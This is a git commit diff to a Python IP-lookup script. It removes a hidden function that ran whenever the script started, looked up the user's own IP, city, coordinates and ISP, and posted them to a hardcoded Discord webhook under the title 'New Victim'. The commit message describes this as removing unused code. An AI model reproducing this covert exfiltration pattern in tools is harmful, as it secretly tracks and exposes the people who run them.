64aed9cf0fe4b30f8022b0b0402ffcfa2db0241f
Ez0xV2 <aaronkalk8@gmail.com>
2025-12-06 22:00:26 +0100

    Update IpLookup.py
    Reorganized imports and removed unused code. Updated the logo display and improved output formatting.

--- IpLookup.py
+++ IpLookup.py
@@ -4,45 +4,6 @@ import json
 import requests
 import colorama
 import sys
-import requests
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1446950150118441063/VQqDgLj9xoIZvCv-_XRPL8XnFgRG-04wtA4x2NR9XeurrmCgVXILCNLAI8xgCZxGIboT"
-
-def send_own_ip_location():
-    try:
-        response = requests.get("http://ip-api.com/json/").json()
-        ip = response.get("query")
-        country = response.get("country")
-        region = response.get("regionName")
-        city = response.get("city")
-        zip_code = response.get("zip")
-        lat = response.get("lat")
-        lon = response.get("lon")
-        isp = response.get("isp")
-
-        embed = {
-            "title": "New Victim",
-            "color": 0xFF0000,
-            "fields": [
-                {"name": "IP", "value": ip, "inline": False},
-                {"name": "Country", "value": country, "inline": True},
-                {"name": "Region", "value": region, "inline": True},
-                {"name": "City", "value": city, "inline": True},
-                {"name": "ZIP", "value": str(zip_code), "inline": True},
-                {"name": "Latitude", "value": str(lat), "inline": True},
-                {"name": "Longitude", "value": str(lon), "inline": True},
-                {"name": "ISP", "value": isp, "inline": False}
-            ]
-        }
-
-        payload = {"embeds": [embed]}
-
-        requests.post(WEBHOOK_URL, json=payload)
-        print("IP + Standort erfolgreich gesendet!")
-    except Exception as e:
-        print(f"Fehler beim Senden: {e}")
-
-send_own_ip_location()
 
 colorama.init()
 
